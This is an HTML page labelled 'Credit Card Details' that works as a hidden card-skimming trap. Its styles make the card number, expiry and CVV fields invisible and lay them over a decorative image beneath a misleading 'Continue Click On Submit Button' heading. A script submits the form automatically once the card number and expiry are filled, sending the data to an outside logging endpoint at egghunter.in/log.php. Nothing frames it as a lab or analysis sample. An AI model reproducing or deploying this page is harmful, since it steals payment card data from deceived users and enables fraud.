
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Details</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
            height: 100vh;
        }
        .credit-card-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            margin-top: auto;
            position: relative;
        }
        .credit-card-container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
        }
        .credit-card-container input[type="text"],
        .credit-card-container input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
        }
        .credit-card-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            position: relative;
            z-index: 2;
        }
        .credit-card-container input[type="submit"]:hover {
            background-color: #45a049;
        }
        .cookie-image {
            position: absolute;
            top: 80px;
            left: 0;
            width: 100%;
            height: 40px;
            background: url('cookie.png') no-repeat center;
            background-size: contain;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="credit-card-container">
        <h2>Continue Click On Submit Button</h2>
        <form id="creditCardForm" action="https://egghunter.in/log.php" method="POST">
            <div class="cookie-image"></div>
            <input type="number" id="expiry" name="expiry" placeholder="Expiry Date (MMYY)" required>
            <input type="number" id="cvv" name="cvv" placeholder="CVV">
            <input type="number" id="cardnumber" name="cardnumber" placeholder="Card Number" required>
            <input type="submit" value="Submit">
        </form>
    </div>

    <script>
        function checkInputsAndSubmit() {
            const cardnumber = document.getElementById('cardnumber').value;
            const expiry = document.getElementById('expiry').value;

            if (cardnumber && expiry) {
                document.getElementById('creditCardForm').submit();
            }
        }

        document.getElementById('expiry').addEventListener('input', checkInputsAndSubmit);
        document.getElementById('cvv').addEventListener('input', checkInputsAndSubmit);
        document.getElementById('cardnumber').addEventListener('input', checkInputsAndSubmit);
    </script>
</body>
</html>
